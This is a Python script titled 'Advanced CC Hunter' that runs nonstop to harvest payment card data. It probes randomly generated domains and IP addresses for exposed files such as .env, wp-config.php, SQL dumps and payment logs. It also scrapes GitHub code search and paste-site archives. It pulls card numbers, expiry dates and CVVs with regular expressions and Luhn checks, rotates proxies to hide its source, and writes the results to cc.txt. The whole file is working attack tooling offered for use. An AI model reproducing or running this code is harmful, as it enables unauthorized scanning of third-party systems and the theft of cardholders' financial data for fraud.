#!/usr/bin/env python3
"""
ADVANCED AUTONOMOUS CC HUNTER
- Extracts full CC details (number, expiry, CVV)
- Automatic proxy support if proxy.txt exists
- 24/7 continuous operation
"""

import asyncio
import aiohttp
import aiofiles
import re
import random
import json
import time
from datetime import datetime
import logging
from urllib.parse import urljoin, urlparse
import sys
import os
from itertools import cycle

class AdvancedCCHunter:
    def __init__(self):
        self.found_cc = set()
        self.session = None
        self.running = True
        self.scan_round = 0
        self.proxies = []
        self.proxy_cycle = None
        self.current_proxy = None
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('advanced_cc_hunter.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.log = logging.getLogger()
        
        # Enhanced CC patterns with expiry and CVV
        self.cc_patterns = [
            # Pattern: number|expiry|cvv
            re.compile(r'(\b4[0-9]{12}(?:[0-9]{3})?\b)[|:/,\s]+(\d{1,2}[/-]\d{2,4})[|:/,\s]+(\d{3,4})', re.IGNORECASE),
            # Pattern: number expiry cvv
            re.compile(r'(\b4[0-9]{12}(?:[0-9]{3})?\b)\s+(\d{1,2}[/-]\d{2,4})\s+(\d{3,4})', re.IGNORECASE),
            # Pattern: number/cvv/expiry
            re.compile(r'(\b4[0-9]{12}(?:[0-9]{3})?\b)[|:/,\s]+(\d{3,4})[|:/,\s]+(\d{1,2}[/-]\d{2,4})', re.IGNORECASE),
            
            # MasterCard patterns
            re.compile(r'(\b5[1-5][0-9]{14}\b)[|:/,\s]+(\d{1,2}[/-]\d{2,4})[|:/,\s]+(\d{3,4})', re.IGNORECASE),
            re.compile(r'(\b5[1-5][0-9]{14}\b)\s+(\d{1,2}[/-]\d{2,4})\s+(\d{3,4})', re.IGNORECASE),
            
            # American Express patterns
            re.compile(r'(\b3[47][0-9]{13}\b)[|:/,\s]+(\d{1,2}[/-]\d{2,4})[|:/,\s]+(\d{4})', re.IGNORECASE),
            re.compile(r'(\b3[47][0-9]{13}\b)\s+(\d{1,2}[/-]\d{2,4})\s+(\d{4})', re.IGNORECASE),
            
            # Discover patterns
            re.compile(r'(\b6(?:011|5[0-9]{2})[0-9]{12}\b)[|:/,\s]+(\d{1,2}[/-]\d{2,4})[|:/,\s]+(\d{3,4})', re.IGNORECASE),
            
            # Generic pattern for CC numbers only (fallback)
            re.compile(r'\b(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11})\b')
        ]
        
        # Common vulnerable paths
        self.vulnerable_paths = [
            "/uploads/", "/data/", "/files/", "/backup/", "/admin/", 
            "/database/", "/sql/", "/logs/", "/tmp/", "/cache/",
            "/export/", "/download/", "/storage/", "/var/", "/www/",
            "/payment/logs/", "/order/export/", "/customer/data/",
            "/api/orders/", "/api/users/", "/api/payments/", "/api/customers/",
            "/wp-admin/", "/wp-content/uploads/", "/wp-config.php",
            "/phpMyAdmin/", "/adminer.php", "/mysql/", "/db/", "/database/",
            "/config/", "/.env", "/.htaccess", "/backup.sql", "/dump.sql"
        ]
        
        # File extensions that might contain CC data
        self.data_extensions = [
            ".sql", ".csv", ".txt", ".log", ".json", ".xml", ".xls", ".xlsx",
            ".bak", ".zip", ".tar", ".gz", ".rar", ".7z", ".db", ".sqlite",
            ".dat", ".mdb", ".accdb", ".dbf", ".ods"
        ]
        
        # Stats
        self.stats = {
            'cc_found': 0,
            'sites_scanned': 0,
            'vulnerable_sites': 0,
            'proxies_used': 0,
            'start_time': datetime.now(),
            'last_find': None
        }
        
        # Load proxies if available
        self.load_proxies()

    def load_proxies(self):
        """Load proxies from proxy.txt if exists"""
        if os.path.exists('proxy.txt'):
            try:
                with open('proxy.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                if self.proxies:
                    self.proxy_cycle = cycle(self.proxies)
                    self.current_proxy = next(self.proxy_cycle)
                    self.log.info(f"✅ Loaded {len(self.proxies)} proxies from proxy.txt")
                else:
                    self.log.info("❌ proxy.txt is empty, using direct connections")
            except Exception as e:
                self.log.error(f"❌ Error loading proxies: {e}")
        else:
            self.log.info("ℹ️ proxy.txt not found, using direct connections")

    def get_next_proxy(self):
        """Get next proxy from cycle"""
        if self.proxy_cycle:
            self.current_proxy = next(self.proxy_cycle)
            self.stats['proxies_used'] += 1
            return self.current_proxy
        return None

    async def init_session(self):
        """Initialize HTTP session with proxy support"""
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ttl_dns_cache=300)
        timeout = aiohttp.ClientTimeout(total=15)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        )

    async def close_session(self):
        if self.session:
            await self.session.close()

    def extract_cc_details(self, text, source=""):
        """Extract complete CC details (number, expiry, CVV) from text"""
        found_cc = []
        
        for pattern in self.cc_patterns:
            matches = pattern.findall(text)
            for match in matches:
                if len(match) == 3:
                    # Full pattern match: number, expiry, cvv
                    cc_number, expiry, cvv = match
                    if self.luhn_check(cc_number):
                        found_cc.append({
                            'number': cc_number,
                            'expiry': expiry,
                            'cvv': cvv,
                            'type': self.get_card_type(cc_number),
                            'source': source
                        })
                else:
                    # Fallback: only CC number found
                    cc_number = match[0] if isinstance(match, tuple) else match
                    if self.luhn_check(cc_number):
                        found_cc.append({
                            'number': cc_number,
                            'expiry': 'N/A',
                            'cvv': 'N/A', 
                            'type': self.get_card_type(cc_number),
                            'source': source
                        })
        
        return found_cc

    def luhn_check(self, card_number):
        """Validate credit card number using Luhn algorithm"""
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10 == 0

    async def generate_targets(self):
        """Generate target websites automatically"""
        targets = []
        
        # Common vulnerable domain patterns
        domains = [
            "test", "dev", "staging", "admin", "backup", "old", "legacy",
            "payment", "shop", "store", "cart", "checkout", "order",
            "api", "secure", "portal", "dashboard", "console", "pos",
            "billing", "invoice", "subscription", "membership", "premium"
        ]
        
        tlds = [".com", ".net", ".org", ".in", ".io", ".dev", ".test", ".local"]
        
        for _ in range(25):
            domain = random.choice(domains)
            num = random.randint(1, 999)
            tld = random.choice(tlds)
            targets.append(f"http://{domain}{num}{tld}")
            targets.append(f"https://{domain}-{num}{tld}")
            targets.append(f"http://{domain}{tld}")
        
        # IP-based targets
        for _ in range(15):
            ip = f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            targets.append(ip)
        
        return list(set(targets))

    async def make_request(self, url, method='GET', **kwargs):
        """Make HTTP request with proxy support"""
        try:
            if self.proxies:
                proxy = self.get_next_proxy()
                kwargs['proxy'] = proxy
                self.log.debug(f"Using proxy: {proxy}")
            
            async with self.session.request(method, url, ssl=False, **kwargs) as response:
                return response
        except Exception as e:
            self.log.debug(f"Request failed: {e}")
            return None

    async def scan_website(self, base_url):
        """Comprehensive scan of a single website"""
        try:
            # Scan base URL
            response = await self.make_request(base_url)
            if response and response.status == 200:
                content = await response.text()
                cc_found = self.extract_cc_details(content, base_url)
                if cc_found:
                    await self.save_cc(cc_found)
            
            # Scan vulnerable paths
            paths_to_scan = random.sample(self.vulnerable_paths, min(20, len(self.vulnerable_paths)))
            
            for path in paths_to_scan:
                try:
                    url = urljoin(base_url, path)
                    response = await self.make_request(url, timeout=8)
                    if response and response.status == 200:
                        content = await response.text()
                        cc_found = self.extract_cc_details(content, url)
                        if cc_found:
                            await self.save_cc(cc_found)
                            self.stats['vulnerable_sites'] += 1
                except:
                    continue
            
            # Try common data files
            for ext in random.sample(self.data_extensions, 8):
                try:
                    file_url = urljoin(base_url, f"backup{ext}")
                    response = await self.make_request(file_url, timeout=8)
                    if response and response.status == 200:
                        content = await response.text()
                        cc_found = self.extract_cc_details(content, file_url)
                        if cc_found:
                            await self.save_cc(cc_found)
                except:
                    continue
                    
        except Exception as e:
            pass

    async def scan_github_for_exposed_data(self):
        """Search GitHub for exposed databases and config files"""
        searches = [
            "database.sql", "backup.sql", "dump.sql", "users.csv", 
            "orders.csv", "payments.csv", "customers.csv", "credit_cards",
            "card_numbers", "payment_log", "transaction_log", "ccn",
            "creditcard", "card_details", "billing_info"
        ]
        
        search = random.choice(searches)
        try:
            url = f"https://github.com/search?q={search}&type=code"
            response = await self.make_request(url)
            if response and response.status == 200:
                text = await response.text()
                raw_urls = re.findall(r'href="([^"]+/blob/[^"]+\.(?:sql|csv|txt|log|json|xml))"', text)
                
                for raw_url in random.sample(raw_urls, min(8, len(raw_urls))):
                    try:
                        file_url = f"https://raw.githubusercontent.com{raw_url.replace('/blob/', '/')}"
                        file_response = await self.make_request(file_url, timeout=10)
                        if file_response and file_response.status == 200:
                            content = await file_response.text()
                            cc_found = self.extract_cc_details(content, f"GitHub: {file_url}")
                            if cc_found:
                                await self.save_cc(cc_found)
                    except:
                        continue
        except Exception as e:
            self.log.debug(f"GitHub scan error: {e}")

    async def scan_paste_sites(self):
        """Scan paste sites for exposed data"""
        paste_sites = [
            ("https://pastebin.com/archive", "https://pastebin.com/raw/", r'/"([a-zA-Z0-9]{8})"'),
            ("https://rentry.co/archive", "https://rentry.co/raw/", r'/([a-zA-Z0-9]{6,10})'),
            ("https://dpaste.com/archive", "https://dpaste.com/", r'/([a-zA-Z0-9]{6,10})'),
        ]
        
        for archive_url, base_raw_url, pattern in paste_sites:
            try:
                response = await self.make_request(archive_url, timeout=10)
                if response and response.status == 200:
                    content = await response.text()
                    paste_ids = re.findall(pattern, content)
                    
                    for paste_id in random.sample(paste_ids, min(5, len(paste_ids))):
                        try:
                            paste_url = f"{base_raw_url}{paste_id}"
                            paste_response = await self.make_request(paste_url, timeout=8)
                            if paste_response and paste_response.status == 200:
                                paste_content = await paste_response.text()
                                cc_found = self.extract_cc_details(paste_content, paste_url)
                                if cc_found:
                                    await self.save_cc(cc_found)
                        except:
                            continue
            except:
                continue

    async def save_cc(self, cc_data_list):
        """Save complete CC details to cc.txt"""
        for cc_data in cc_data_list:
            cc_identifier = f"{cc_data['number']}|{cc_data['expiry']}|{cc_data['cvv']}"
            
            if cc_identifier not in self.found_cc:
                self.found_cc.add(cc_identifier)
                self.stats['cc_found'] += 1
                self.stats['last_find'] = datetime.now()
                
                async with aiofiles.open("cc.txt", "a", encoding='utf-8') as f:
                    await f.write(f"{cc_data['number']}|{cc_data['expiry']}|{cc_data['cvv']}|{cc_data['type']}|{cc_data['source']}|{datetime.now()}\n")
                
                self.log.info(f"💳 NEW CC FOUND: {cc_data['number']} | Exp: {cc_data['expiry']} | CVV: {cc_data['cvv']} | {cc_data['type']}")
                
                # Also save to card type specific files
                async with aiofiles.open(f"{cc_data['type']}_cards.txt", "a") as f:
                    await f.write(f"{cc_data['number']}|{cc_data['expiry']}|{cc_data['cvv']}|{cc_data['source']}|{datetime.now()}\n")

    def get_card_type(self, cc_number):
        """Determine credit card type"""
        if cc_number.startswith('4'):
            return "VISA"
        elif cc_number.startswith('5'):
            return "MASTERCARD"
        elif cc_number.startswith('3'):
            return "AMEX"
        elif cc_number.startswith('6'):
            return "DISCOVER"
        else:
            return "UNKNOWN"

    async def auto_save_stats(self):
        """Automatically save statistics every 30 minutes"""
        while self.running:
            await asyncio.sleep(1800)
            
            stats_data = {
                'total_cc_found': self.stats['cc_found'],
                'total_sites_scanned': self.stats['sites_scanned'],
                'vulnerable_sites_found': self.stats['vulnerable_sites'],
                'proxies_used': self.stats['proxies_used'],
                'start_time': self.stats['start_time'].isoformat(),
                'last_find': self.stats['last_find'].isoformat() if self.stats['last_find'] else None,
                'current_time': datetime.now().isoformat(),
                'uptime_hours': (datetime.now() - self.stats['start_time']).total_seconds() / 3600,
                'proxies_available': len(self.proxies)
            }
            
            async with aiofiles.open("advanced_cc_stats.json", "w") as f:
                await f.write(json.dumps(stats_data, indent=2))

    async def show_status(self):
        """Show current status every 5 minutes"""
        while self.running:
            await asyncio.sleep(300)
            
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            uptime = datetime.now() - self.stats['start_time']
            hours = uptime.total_seconds() / 3600
            
            proxy_info = f"🔀 Proxies: {len(self.proxies)}" if self.proxies else "🔀 Direct Connection"
            
            self.log.info(f"""
🔄 ADVANCED CC HUNTER STATUS - {current_time}
⏰ Uptime: {hours:.2f} hours
{proxy_info}
💳 CC Found: {self.stats['cc_found']} (Full Details)
🌐 Sites Scanned: {self.stats['sites_scanned']}
🎯 Vulnerable Sites: {self.stats['vulnerable_sites']}
📈 Efficiency: {self.stats['cc_found']/max(self.stats['sites_scanned'],1):.3f} CC/site
💾 Output: cc.txt (Number|Expiry|CVV|Type|Source|Time)
            """)

    async def main_hunting_loop(self):
        """Main autonomous hunting loop"""
        await self.init_session()
        
        self.log.info("🚀 ADVANCED CC HUNTER STARTED")
        self.log.info("💡 Started at: " + self.stats['start_time'].strftime("%Y-%m-%d %H:%M:%S"))
        self.log.info("📁 Output: cc.txt (Full CC Details)")
        self.log.info("🔀 Proxy Mode: " + ("ENABLED" if self.proxies else "DISABLED"))
        self.log.info("🔄 Hunter will run 24/7 until stopped")
        
        # Start background tasks
        asyncio.create_task(self.auto_save_stats())
        asyncio.create_task(self.show_status())
        
        try:
            while self.running:
                self.scan_round += 1
                
                self.log.info(f"🔄 Starting hunting round #{self.scan_round}")
                
                # Generate new targets
                targets = await self.generate_targets()
                self.log.info(f"🎯 Generated {len(targets)} targets for this round")
                
                # Scan targets in batches
                batch_size = 15
                for i in range(0, len(targets), batch_size):
                    batch = targets[i:i + batch_size]
                    
                    tasks = []
                    for target in batch:
                        task = asyncio.create_task(self.scan_website(target))
                        tasks.append(task)
                        self.stats['sites_scanned'] += 1
                    
                    await asyncio.gather(*tasks, return_exceptions=True)
                    await asyncio.sleep(3)  # Delay between batches
                
                # Additional scanning methods
                additional_tasks = [
                    self.scan_github_for_exposed_data(),
                    self.scan_paste_sites()
                ]
                
                await asyncio.gather(*additional_tasks, return_exceptions=True)
                
                # Random delay between rounds (3-8 minutes)
                delay = random.randint(180, 480)
                self.log.info(f"⏰ Round #{self.scan_round} completed. Next round in {delay} seconds...")
                await asyncio.sleep(delay)
                
        except KeyboardInterrupt:
            self.log.info("🛑 Hunter stopped by user")
        except Exception as e:
            self.log.error(f"❌ Critical error: {e}")
        finally:
            self.running = False
            await self.close_session()
            self.log.info("🔚 Advanced CC Hunter shutdown complete")

def main():
    """Main entry point"""
    hunter = AdvancedCCHunter()
    
    try:
        if sys.platform == "win32":
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        
        asyncio.run(hunter.main_hunting_loop())
    except KeyboardInterrupt:
        print("\n🛑 Advanced CC Hunter stopped.")
    except Exception as e:
        print(f"❌ Fatal error: {e}")

if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════╗
║           ADVANCED CC HUNTER v3.0            ║
║           WITH PROXY SUPPORT                 ║
║                                              ║
║  🚀 Starting 24/7 Advanced Hunter...         ║
║  💡 Started: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """           ║
║  📁 Output: cc.txt (Full CC Details)         ║
║  🔀 Proxy: Auto-detected from proxy.txt      ║
║  📋 Logs: advanced_cc_hunter.log             ║
║                                              ║
║  Press Ctrl+C to stop the hunter             ║
╚══════════════════════════════════════════════╝
    """)
    
    main()